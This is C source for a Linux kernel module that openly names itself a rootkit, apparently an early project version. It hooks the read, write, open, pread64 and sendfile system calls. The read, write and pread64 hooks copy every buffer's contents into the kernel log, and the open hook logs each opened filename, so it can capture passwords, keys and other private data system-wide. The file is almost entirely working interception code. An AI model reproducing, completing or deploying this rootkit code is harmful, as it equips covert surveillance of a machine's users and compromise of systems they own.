#include "rootkit-main.h"

#include "hooking.h"
#include <linux/ioctl.h>
#include <linux/limits.h>
#include <linux/linkage.h>
#include <linux/miscdevice.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static sysfun_t orig_read;
static sysfun_t orig_write;
static sysfun_t orig_open;
static sysfun_t orig_pread64;
static sysfun_t orig_sendfile;
// static sysfun_t orig_readv;
// static sysfun_t orig_preadv;

static hook_t p_syscall_hooks[] = {
    NEW_HOOK(__NR_read, new_read, orig_read),
    NEW_HOOK(__NR_write, new_write, orig_write),
    NEW_HOOK(__NR_open, new_open, orig_open),
    NEW_HOOK(__NR_pread64, new_pread64, orig_pread64),
    NEW_HOOK(__NR_sendfile, new_sendfile, orig_sendfile),
    // NEW_HOOK(__NR_readv, new_readv, orig_readv),
    // NEW_HOOK(__NR_preadv, new_preadv, orig_preadv),
};

static int __init rootkit_init(void)
{
    int i_err;

    // Initialize hooking
    i_err = init_hooking();

    if (i_err) {
        pr_err("[ROOTKIT] Failed to initialize hooking");
        return i_err;
    }

    hook_syscalls(p_syscall_hooks, ARRAY_SIZE(p_syscall_hooks));

    pr_info("[ROOTKIT] Module loaded");
    return 0;
}

static __exit void rootkit_exit(void)
{
    // Restore original syscall functions
    unhook_syscalls(p_syscall_hooks, ARRAY_SIZE(p_syscall_hooks));

    pr_info("[ROOTKIT] Module unloaded");
    return;
}

asmlinkage long new_read(struct pt_regs *p_regs)
{
    unsigned int ui32_fd = (unsigned int)p_regs->di;  // first parameter
    char __user *s_buf   = (char __user *)p_regs->si; // second parameter
    size_t sz_count      = (size_t)p_regs->dx;        // third parameter

    long l_err;
    long l_ret;
    char *s_data;

    pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    l_ret = orig_read(p_regs);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user");
        } else {
            pr_info("[ROOTKIT] * Data read: %.*s", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

asmlinkage long new_write(struct pt_regs *p_regs)
{
    unsigned int ui32_fd     = (unsigned int)p_regs->di;
    const char __user *s_buf = (const char __user *)p_regs->si;
    size_t sz_count          = (size_t)p_regs->dx;

    long l_err;
    char *s_data;

    pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user");
        } else {
            pr_info("[ROOTKIT] * Data to write: %.*s", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return orig_write(p_regs);
}

asmlinkage long new_open(struct pt_regs *p_regs)
{
    const char __user *s_filename = (const char *)p_regs->di;
    int i32_flags                 = (int)p_regs->si;
    umode_t ui16_mode             = (umode_t)p_regs->dx;

    long l_err;
    char *s_filename_k;

    s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);

    if (s_filename_k == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_filename_k, s_filename, PATH_MAX);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy filename from user");
            strncpy(s_filename_k, "(unknown)", PATH_MAX);
        }

        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", s_filename_k, i32_flags, ui16_mode);

        kvfree(s_filename_k);
    }

    return orig_open(p_regs);
}

asmlinkage long new_pread64(struct pt_regs *p_regs)
{
    unsigned int ui32_fd = (unsigned int)p_regs->di;
    char __user *s_buf   = (char __user *)p_regs->si;
    size_t sz_count      = (size_t)p_regs->dx;
    loff_t i64_pos       = (loff_t)p_regs->r10;

    long l_err;
    long l_ret;
    char *s_data;

    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);

    l_ret = orig_pread64(p_regs);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user");
        } else {
            pr_info("[ROOTKIT] * Data read: %.*s", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

asmlinkage long new_sendfile(struct pt_regs *p_regs)
{
    int i32_out_fd          = (int)p_regs->di;
    int i32_in_fd           = (int)p_regs->si;
    loff_t __user *p_offset = (loff_t __user *)p_regs->dx;
    size_t sz_count         = (size_t)p_regs->r10;

    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);

    return orig_sendfile(p_regs);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
